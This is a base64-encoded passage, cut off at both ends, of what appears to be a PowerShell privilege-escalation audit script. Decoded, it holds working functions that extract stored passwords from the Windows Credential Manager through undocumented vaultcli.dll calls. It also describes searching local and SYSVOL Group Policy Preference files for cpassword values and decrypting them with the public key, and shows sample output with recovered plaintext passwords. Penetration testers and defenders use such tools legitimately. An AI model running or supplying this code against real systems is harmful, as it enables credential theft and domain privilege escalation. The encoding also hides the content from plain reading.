G00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIENyZWRlbnRpYWxzIHNhdmVkIGluIEludGVybmV0IEV4cGxvcmVyIG9yIEVkZ2UgZm9yIGV4YW1wbGUgYXJlIGFjdHVhbGx5IHNhdmVkIGluIHRoZSBzeXN0ZW0ncyAKICAgIENyZWRlbnRpYWwgTWFuYWdlci4gVGhlc2UgY3JlZGVudGlhbHMgY2FuIGJlIGV4dHJhY3RlZCB1c2luZyB1bmRvY3VtZW50ZWQgV2luZG93cyBBUEkgZnVuY3Rpb25zCiAgICBmcm9tICJ2YXVsdGNsaS5kbGwiLiBJdCdzIGhpZ2hseSBpbnNwaXJlZCBmcm9tIHRoZSAidmF1bHQ6Omxpc3QiIGNvbW1hbmQgb2YgTSptKmsqdHogKGJ5IAogICAgQmVuamFtaW4gRGVscHkgQGdlbnRpbGtpd2kpIGFuZCAiR2V0LVZhdWx0Q3JlZGVudGlhbC5wczEiIChieSBNYXR0aGV3IEdyYWViZXIpLiAKICAgIE9ubHkgZW50cmllcyBjb250YWluaW5nIGEgbm9uLWVtcHR5IHBhc3N3b3JkIGZpZWxkIGFyZSByZXR1cm5lZCBhcyBhIGN1c3RvbSBQUyBvYmplY3QuIAoKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtVmF1bHRMaXN0Q2hlY2sKCiAgICBUeXBlICAgICAgICA6IFdlYiBDcmVkZW50aWFscwogICAgVGFyZ2V0TmFtZSAgOiBodHRwczovL2dpdGh1Yi5jb20vCiAgICBVc2VyTmFtZSAgICA6IGZvbzEyM0BleGFtcGxlLmNvbQogICAgQ3JlZGVudGlhbCAgOiBmb28xMjMKICAgIExhc3RXcml0dGVuIDogMDEvMDEvMTk3MCAxMzozNzowMAoKICAgIC5MSU5LCgogICAgaHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHovYmxvYi9tYXN0ZXIvbWltaWthdHovbW9kdWxlcy9rdWhsX21fdmF1bHQuYwogICAgaHR0cHM6Ly9naXRodWIuY29tL0VtcGlyZVByb2plY3QvRW1waXJlL2Jsb2IvbWFzdGVyL2RhdGEvbW9kdWxlX3NvdXJjZS9jcmVkZW50aWFscy9HZXQtVmF1bHRDcmVkZW50aWFsLnBzMQoKICAgICM+CiAgICAKCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgZnVuY3Rpb24gR2V0LVZhdWx0TmFtZUZyb21HdWlkIHsKICAgICAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICAgICAgW0d1aWRdICRWYXVsdEd1aWQKICAgICAgICApCgogICAgICAgICRWYXVsdFNjaGVtYUVudW0gPSBAewogICAgICAgICAgICAoW0d1aWRdICcyRjFBNjUwNC0wNjQxLTQ0Q0YtOEJCNS0zNjEyRDg2NUYyRTUnKSA9ICdXaW5kb3dzIFNlY3VyZSBOb3RlJwogICAgICAgICAgICAoW0d1aWRdICczQ0NENTQ5OS04N0E4LTRCMTAtQTIxNS02MDg4ODhERDNCNTUnKSA9ICdXaW5kb3dzIFdlYiBQYXNzd29yZCBDcmVkZW50aWFsJwogICAgICAgICAgICAoW0d1aWRdICcxNTRFMjNEMC1DNjQ0LTRFNkYtOENFNi01MDY5MjcyRjk5OUYnKSA9ICdXaW5kb3dzIENyZWRlbnRpYWwgUGlja2VyIFByb3RlY3RvcicKICAgICAgICAgICAgKFtHdWlkXSAnNEJGNEM0NDItOUI4QS00MUEwLUIzODAtREQ0QTcwNEREQjI4JykgPSAnV2ViIENyZWRlbnRpYWxzJwogICAgICAgICAgICAoW0d1aWRdICc3N0JDNTgyQi1GMEE2LTRFMTUtNEU4MC02MTczNkI2RjNCMjknKSA9ICdXaW5kb3dzIENyZWRlbnRpYWxzJwogICAgICAgICAgICAoW0d1aWRdICdFNjlENzgzOC05MUI1LTRGQzktODlENS0yMzBENEQ0Q0MyQkMnKSA9ICdXaW5kb3dzIERvbWFpbiBDZXJ0aWZpY2F0ZSBDcmVkZW50aWFsJwogICAgICAgICAgICAoW0d1aWRdICczRTBFMzVCRS0xQjc3LTQzRTctQjg3My1BRUQ5MDFCNjI3NUInKSA9ICdXaW5kb3dzIERvbWFpbiBQYXNzd29yZCBDcmVkZW50aWFsJwogICAgICAgICAgICAoW0d1aWRdICczQzg4NkZGMy0yNjY5LTRBQTItQThGQi0zRjY3NTlBNzc1NDgnKSA9ICdXaW5kb3dzIEV4dGVuZGVkIENyZWRlbnRpYWwnCiAgICAgICAgfQoKICAgICAgICAkVmF1bHRTY2hlbWFFbnVtWyRWYXVsdEd1aWRdCiAgICB9CgogICAgIyBIaWdobHkgaW5zcGlyZWQgZnJvbSAiR2V0LVZhdWx0Q3JlZGVudGlhbC5wczEiLCBjcmVkaXQgZ29lcyB0byBNYXR0aGV3IEdyYWViZXIKICAgICMgaHR0cHM6Ly9naXRodWIuY29tL0VtcGlyZVByb2plY3QvRW1waXJlL2Jsb2IvbWFzdGVyL2RhdGEvbW9kdWxlX3NvdXJjZS9jcmVkZW50aWFscy9HZXQtVmF1bHRDcmVkZW50aWFsLnBzMQogICAgZnVuY3Rpb24gR2V0LVZhdWx0SXRlbUVsZW1lbnRWYWx1ZSB7CiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgICAgIFtJbnRQdHJdICRWYXVsdEl0ZW1FbGVtZW50UHRyCiAgICAgICAgKQoKICAgICAgICBpZiAoJFZhdWx0SXRlbUVsZW1lbnRQdHIgLWVxIFtJbnRQdHJdOjpaZXJvKSB7CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KCiAgICAgICAgJFZhdWx0SXRlbURhdGFIZWFkZXIgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRWYXVsdEl0ZW1FbGVtZW50UHRyLCBbdHlwZV0gW1ByaXZlc2NDaGVjay5XaW4zMitWQVVMVF9JVEVNX0RBVEFfSEVBREVSXSkKICAgICAgICAkVmF1bHRJdGVtRGF0YVZhbHVlUHRyID0gW0ludFB0cl0gKCRWYXVsdEl0ZW1FbGVtZW50UHRyLlRvSW50NjQoKSArIDE2KQoKICAgICAgICBzd2l0Y2ggKCRWYXVsdEl0ZW1EYXRhSGVhZGVyLlR5cGUpIHsKCiAgICAgICAgICAgICMgRWxlbWVudFR5cGVfQm9vbGVhbgogICAgICAgICAgICAweDAwIHsKICAgICAgICAgICAgICAgIFtCb29sXSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRCeXRlKCRWYXVsdEl0ZW1EYXRhVmFsdWVQdHIpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgRWxlbWVudFR5cGVfU2hvcnQKICAgICAgICAgICAgMHgwMSB7CiAgICAgICAgICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRJbnQxNigkVmF1bHRJdGVtRGF0YVZhbHVlUHRyKQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIEVsZW1lbnRUeXBlX1Vuc2lnbmVkU2hvcnQKICAgICAgICAgICAgMHgwMiB7CiAgICAgICAgICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRJbnQxNigkVmF1bHRJdGVtRGF0YVZhbHVlUHRyKQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIEVsZW1lbnRUeXBlX0ludGVnZXIKICAgICAgICAgICAgMHgwMyB7CiAgICAgICAgICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRJbnQzMigkVmF1bHRJdGVtRGF0YVZhbHVlUHRyKQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIEVsZW1lbnRUeXBlX1Vuc2lnbmVkSW50ZWdlcgogICAgICAgICAgICAweDA0IHsKICAgICAgICAgICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludDMyKCRWYXVsdEl0ZW1EYXRhVmFsdWVQdHIpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgRWxlbWVudFR5cGVfRG91YmxlCiAgICAgICAgICAgIDB4MDUgewogICAgICAgICAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVmF1bHRJdGVtRGF0YVZhbHVlUHRyLCBbVHlwZV0gW0RvdWJsZV0pCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgRWxlbWVudFR5cGVfR3VpZAogICAgICAgICAgICAweDA2IHsKICAgICAgICAgICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFZhdWx0SXRlbURhdGFWYWx1ZVB0ciwgW1R5cGVdIFtHdWlkXSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBFbGVtZW50VHlwZV9TdHJpbmcKICAgICAgICAgICAgMHgwNyB7IAogICAgICAgICAgICAgICAgJFN0cmluZ1B0ciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludFB0cigkVmF1bHRJdGVtRGF0YVZhbHVlUHRyKQogICAgICAgICAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ1VuaSgkU3RyaW5nUHRyKQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIEVsZW1lbnRUeXBlX0J5dGVBcnJheQogICAgICAgICAgICAweDA4IHsKCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgRWxlbWVudFR5cGVfVGltZVN0YW1wCiAgICAgICAgICAgIDB4MDkgewoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBFbGVtZW50VHlwZV9Qcm90ZWN0ZWRBcnJheQogICAgICAgICAgICAweDBhIHsKCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgRWxlbWVudFR5cGVfQXR0cmlidXRlCiAgICAgICAgICAgIDB4MGIgewoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBFbGVtZW50VHlwZV9TaWQKICAgICAgICAgICAgMHgwYyB7CiAgICAgICAgICAgICAgICAkU2lkUHRyID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWFkSW50UHRyKCRWYXVsdEl0ZW1EYXRhVmFsdWVQdHIpCiAgICAgICAgICAgICAgICAkU2lkT2JqZWN0ID0gW1NlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdICgkU2lkUHRyKQogICAgICAgICAgICAgICAgJFNpZE9iamVjdC5WYWx1ZQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIEVsZW1lbnRUeXBlX01heAogICAgICAgICAgICAweDBkIHsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgICRWYXVsdHNDb3VudCA9IDAKICAgICRWYXVsdEd1aWRzID0gW0ludFB0cl06Olplcm8gCiAgICAkUmVzdWx0ID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OlZhdWx0RW51bWVyYXRlVmF1bHRzKDAsIFtyZWZdJFZhdWx0c0NvdW50LCBbcmVmXSRWYXVsdEd1aWRzKQoKICAgIGlmICgkUmVzdWx0IC1lcSAwKSB7CgogICAgICAgIFdyaXRlLVZlcmJvc2UgIlZhdWx0RW51bWVyYXRlVmF1bHRzKCkgT0sgLSBDb3VudDogJCgkVmF1bHRzQ291bnQpIgoKICAgICAgICBmb3IgKCRpID0gMDsgJGkgLWx0ICRWYXVsdHNDb3VudDsgJGkrKykgewoKICAgICAgICAgICAgJFZhdWx0R3VpZFB0ciA9IFtJbnRQdHJdICgkVmF1bHRHdWlkcy5Ub0ludDY0KCkgKyAoJGkgKiBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0gW0d1aWRdKSkpCiAgICAgICAgICAgICRWYXVsdEd1aWQgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRWYXVsdEd1aWRQdHIsIFt0eXBlXSBbR3VpZF0pCiAgICAgICAgICAgICRWYXVsdE5hbWUgPSBHZXQtVmF1bHROYW1lRnJvbUd1aWQgLVZhdWx0R3VpZCAkVmF1bHRHdWlkCgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJWYXVsdDogJCgkVmF1bHRHdWlkKSAtICQoJFZhdWx0TmFtZSkiCgogICAgICAgICAgICAkVmF1bHRIYW5kbGUgPSBbSW50UHRyXTo6WmVybyAKICAgICAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpWYXVsdE9wZW5WYXVsdCgkVmF1bHRHdWlkUHRyLCAwLCBbcmVmXSRWYXVsdEhhbmRsZSkKCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAwKSB7CgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVmF1bHRPcGVuVmF1bHQoKSBPSyAtIFZhdWx0IEhhbmRsZTogMHgkKCRWYXVsdEhhbmRsZS5Ub1N0cmluZygnWDgnKSkiCgogICAgICAgICAgICAgICAgJFZhdWx0SXRlbXNDb3VudCA9IDAKICAgICAgICAgICAgICAgICRJdGVtc1B0ciA9IFtJbnRQdHJdOjpaZXJvIAogICAgICAgICAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpWYXVsdEVudW1lcmF0ZUl0ZW1zKCRWYXVsdEhhbmRsZSwgMHgwMjAwLCBbcmVmXSRWYXVsdEl0ZW1zQ291bnQsIFtyZWZdJEl0ZW1zUHRyKQoKICAgICAgICAgICAgICAgICRWYXVsdEl0ZW1QdHIgPSAkSXRlbXNQdHIKCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgMCkgewoKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJWYXVsdEVudW1lcmF0ZUl0ZW1zKCkgT0sgLSBJdGVtcyBDb3VudDogJCgkVmF1bHRJdGVtc0NvdW50KSIKCiAgICAgICAgICAgICAgICAgICAgJE9TVmVyc2lvbiA9IFtFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi5WZXJzaW9uCgogICAgICAgICAgICAgICAgICAgIHRyeSB7CgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKCRqID0gMDsgJGogLWx0ICRWYXVsdEl0ZW1zQ291bnQ7ICRqKyspIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9TVmVyc2lvbi5NYWpvciAtbGUgNiAtYW5kICRPU1ZlcnNpb24uTWlub3IgLWxlIDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFdpbmRvd3MgNwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRWYXVsdEl0ZW1UeXBlID0gW3R5cGVdIFtQcml2ZXNjQ2hlY2suV2luMzIrVkFVTFRfSVRFTV83XQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFdpbmRvd3MgOCsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVmF1bHRJdGVtVHlwZSA9IFt0eXBlXSBbUHJpdmVzY0NoZWNrLldpbjMyK1ZBVUxUX0lURU1fOF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFZhdWx0SXRlbSA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFZhdWx0SXRlbVB0ciwgW3R5cGVdICRWYXVsdEl0ZW1UeXBlKQogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9TVmVyc2lvbi5NYWpvciAtbGUgNiAtYW5kICRPU1ZlcnNpb24uTWlub3IgLWxlIDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFdpbmRvd3MgNwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXNzd29yZEl0ZW1QdHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHQgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6VmF1bHRHZXRJdGVtNygkVmF1bHRIYW5kbGUsIFtyZWZdJFZhdWx0SXRlbS5TY2hlbWFJZCwgJFZhdWx0SXRlbS5SZXNvdXJjZSwgJFZhdWx0SXRlbS5JZGVudGl0eSwgW0ludFB0cl06Olplcm8sIDAsIFtyZWZdJFBhc3N3b3JkSXRlbVB0cikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBXaW5kb3dzIDgrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFBhc3N3b3JkSXRlbVB0ciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpWYXVsdEdldEl0ZW04KCRWYXVsdEhhbmRsZSwgW3JlZl0kVmF1bHRJdGVtLlNjaGVtYUlkLCAkVmF1bHRJdGVtLlJlc291cmNlLCAkVmF1bHRJdGVtLklkZW50aXR5LCAkVmF1bHRJdGVtLlBhY2thZ2VTaWQsIFtJbnRQdHJdOjpaZXJvLCAwLCBbcmVmXSRQYXNzd29yZEl0ZW1QdHIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlZhdWx0R2V0SXRlbSgpIE9LIC0gSXRlbVB0cjogMHgkKCRQYXNzd29yZEl0ZW1QdHIuVG9TdHJpbmcoJ1g4JykpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXNzd29yZEl0ZW0gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRQYXNzd29yZEl0ZW1QdHIsIFtUeXBlXSAkVmF1bHRJdGVtVHlwZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUGFzc3dvcmQgPSBHZXQtVmF1bHRJdGVtRWxlbWVudFZhbHVlIC1WYXVsdEl0ZW1FbGVtZW50UHRyICRQYXNzd29yZEl0ZW0uQXV0aGVudGljYXRvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtQcml2ZXNjQ2hlY2suV2luMzJdOjpWYXVsdEZyZWUoJFBhc3N3b3JkSXRlbVB0cikgfCBPdXQtTnVsbCAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlZhdWx0R2V0SXRlbSgpIGZhaWxlZCAtIEVycjogMHgkKCRSZXN1bHQuVG9TdHJpbmcoJ1g4JykpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCBbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkUGFzc3dvcmQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVHlwZSIgLVZhbHVlICRWYXVsdE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlRhcmdldE5hbWUiIC1WYWx1ZSAkKEdldC1WYXVsdEl0ZW1FbGVtZW50VmFsdWUgLVZhdWx0SXRlbUVsZW1lbnRQdHIgJFZhdWx0SXRlbS5SZXNvdXJjZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZXJOYW1lIiAtVmFsdWUgJChHZXQtVmF1bHRJdGVtRWxlbWVudFZhbHVlIC1WYXVsdEl0ZW1FbGVtZW50UHRyICRWYXVsdEl0ZW0uSWRlbnRpdHkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJDcmVkZW50aWFsIiAtVmFsdWUgJFBhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJMYXN0V3JpdHRlbiIgLVZhbHVlICQoW0RhdGVUaW1lXTo6RnJvbUZpbGVUaW1lVXRjKCRWYXVsdEl0ZW0uTGFzdFdyaXR0ZW4pKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJdGVtCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFZhdWx0SXRlbVB0ciA9IFtJbnRQdHJdICgkVmF1bHRJdGVtUHRyLlRvSW50NjQoKSArIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSAkVmF1bHRJdGVtVHlwZSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCBbRXhjZXB0aW9uXSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJF8uRXhjZXB0aW9uLk1lc3NhZ2UgCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVmF1bHRFbnVtZXJhdGVJdGVtcygpIGZhaWxlZCAtIEVycjogMHgkKCRSZXN1bHQuVG9TdHJpbmcoJ1g4JykpIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIFtQcml2ZXNjQ2hlY2suV2luMzJdOjpWYXVsdENsb3NlVmF1bHQoW3JlZl0kVmF1bHRIYW5kbGUpIHwgT3V0LU51bGwgCgogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVmF1bHRPcGVuVmF1bHQoKSBmYWlsZWQgLSBFcnI6IDB4JCgkUmVzdWx0LlRvU3RyaW5nKCdYOCcpKSIKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICB9IGVsc2UgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlZhdWx0RW51bWVyYXRlVmF1bHRzKCkgZmFpbGVkIC0gRXJyOiAweCQoJFJlc3VsdC5Ub1N0cmluZygnWDgnKSkiCiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1HUFBQYXNzd29yZENoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBMaXN0cyBHcm91cCBQb2xpY3kgUHJlZmVyZW5jZXMgKEdQUCkgY29udGFpbmluZyBhIG5vbi1lbXB0eSAiY3Bhc3N3b3JkIiBmaWVsZAoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBDcmVkaXQ6IEBvYnNjdXJlc2VjLCBAaGFybWoweQogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIEJlZm9yZSBLQjI5MjgxMjAgKHNlZSBNUzE0LTAyNSksIHNvbWUgR3JvdXAgUG9saWN5IFByZWZlcmVuY2VzIGNvdWxkIGJlIGNvbmZpZ3VyZWQgd2l0aCBhIAogICAgY3VzdG9tIGFjY291bnQuIFRoaXMgZmVhdHVyZSB3YXMgbWFpbmx5IHVzZWQgdG8gZGVwbG95IGEgY3VzdG9tIGxvY2FsIGFkbWluaXN0cmF0b3IgYWNjb3VudCBvbgogICAgYSBncm91cCBvZiBtYWNoaW5lcy4gVGhlcmUgd2VyZSB0d28gcHJvYmxlbXMgd2l0aCB0aGlzIGFwcHJvYWNoIHRob3VnaC4gRmlyc3QsIHNpbmNlIHRoZSBHcm91cCAKICAgIFBvbGljeSBPYmplY3RzIGFyZSBzdG9yZWQgYXMgWE1MIGZpbGVzIGluIFNZU1ZPTCwgYW55IGRvbWFpbiB1c2VyIGNhbiByZWFkIHRoZW0uIFRoZSBzZWNvbmQgCiAgICBwcm9ibGVtIGlzIHRoYXQgdGhlIHBhc3N3b3JkIHNldCBpbiB0aGVzZSBHUFBzIGlzIEFFUzI1Ni1lbmNyeXB0ZWQgd2l0aCBhIGRlZmF1bHQga2V5LCB3aGljaCAKICAgIGlzIHB1YmxpY2x5IGRvY3VtZW50ZWQuIFRoaXMgbWVhbnMgdGhhdCBhbnkgYXV0aGVudGljYXRlZCB1c2VyIGNvdWxkIHBvdGVudGlhbGx5IGFjY2VzcyB2ZXJ5IAogICAgc2Vuc2l0aXZlIGRhdGEgYW5kIGVsZXZhdGUgdGhlaXIgcHJpdmlsZWdlcyBvbiB0aGVpciBtYWNoaW5lIG9yIGV2ZW4gdGhlIGRvbWFpbi4gCgogICAgVGhpcyBmdW5jdGlvbiB3aWxsIGNoZWNrIHdoZXRoZXIgYW55IGxvY2FsbHkgY2FjaGVkIEdQUCBmaWxlIGNvbnRhaW5zIGEgbm9uLWVtcHR5ICJjcGFzc3dvcmQiIAogICAgZmllbGQuIElmIHNvLCBpdCB3aWxsIGRlY3J5cHQgaXQgYW5kIHJldHVybiBhIGN1c3RvbSBQUyBvYmplY3QgY29udGFpbmluZyBzb21lIGluZm9ybWF0aW9uIAogICAgYWJvdXQgdGhlIEdQUCBhbG9uZyB3aXRoIHRoZSBsb2NhdGlvbiBvZiB0aGUgZmlsZS4gCiAgICAKICAgIC5QQVJBTUVURVIgUmVtb3RlCgogICAgU2V0IHRoaXMgZmxhZyBpZiB5b3Ugd2FudCB0byBzZWFyY2ggZm9yIEdQUCBmaWxlcyBpbiB0aGUgU1lTVk9MIHNoYXJlIG9mIHlvdXIgcHJpbWFyeSBEb21haW4KICAgIENvbnRyb2xsZXIuIEluaXRpYWxseSwgSSB3YW50ZWQgdG8gZG8gb25seSBsb2NhbCBjaGVja3MgYnV0IHRoaXMgd2FzIGEgc3BlY2lhbCByZXF1ZXN0IGZyb20KICAgIEBtcGduX3g2NCBzbyBJIGNvdWxkbid0IHNheSBubyA6UC4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1HUFBQYXNzd29yZENoZWNrCgogICAgVHlwZSAgICAgOiBNYXBwZWQgRHJpdmUKICAgIFVzZXJOYW1lIDogc2hhcmV1c2VyCiAgICBQYXNzd29yZCA6IFMzY3VyM1NoYXIzCiAgICBDb250ZW50ICA6IFBhdGg6IFxcZXZpbGNvcnAubGFiXFNlY3VyZVNoYXJlCiAgICBDaGFuZ2VkICA6IDIwMjAtMDItMDkgMTQ6MDM6NTcKICAgIEZpbGVQYXRoIDogQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XEdyb3VwIFBvbGljeVxIaXN0b3J5XHszQTYxNDcwQi1GRDM4LTQ2MkEtQTJFMi1GQzI3OUEyNzU0QUV9XFMtMS01LTIxLTIxMzUyNDYwNTUtMzc2Njk4NDgwMy01OTIwMTAwOTItMTEwM1xQcmVmZXJlbmNlc1xEcml2ZXNcRHJpdmVzLnhtbAoKICAgIFR5cGUgICAgIDogRGF0YSBTb3VyY2UKICAgIFVzZXJOYW1lIDogZGF0YXNvdXJjZQogICAgUGFzc3dvcmQgOiBTMHVyY2UwZlRoZVByMGJsZW0KICAgIENvbnRlbnQgIDogRFNOOiBzb3VyY2UKICAgIENoYW5nZWQgIDogMjAyMC0wMi0wOSAxMjoyMzo0MwogICAgRmlsZVBhdGggOiBDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcR3JvdXAgUG9saWN5XEhpc3RvcnlcezNGQzk5NDM3LTdDMDYtNDkxQS04RUJDLTc4NkNEQTA1NTg2Mn1cUy0xLTUtMjEtMjEzNTI0NjA1NS0zNzY2OTg0ODAzLTU5MjAxMDA5Mi0xMTAzXFByZWZlcmVuY2VzXERhdGFTb3VyY2VzXERhdGFTb3VyY2VzLnhtbAoKICAgIFR5cGUgICAgIDogU2VydmljZQogICAgVXNlck5hbWUgOiBFVklMQ09SUFxTdmNDb250cm9sCiAgICBQYXNzd29yZCA6IFMzY3IzdFMzcnZpYzMKICAgIENvbnRlbnQgIDogTmFtZTogQ3VzdG9tU2VydmljZQogICAgQ2hhbmdlZCAgOiAyMDIwLTAyLTA5IDEyOjE2OjE4CiAgICBGaWxlUGF0aCA6IEM6XFByb2dyYW1EYXRhX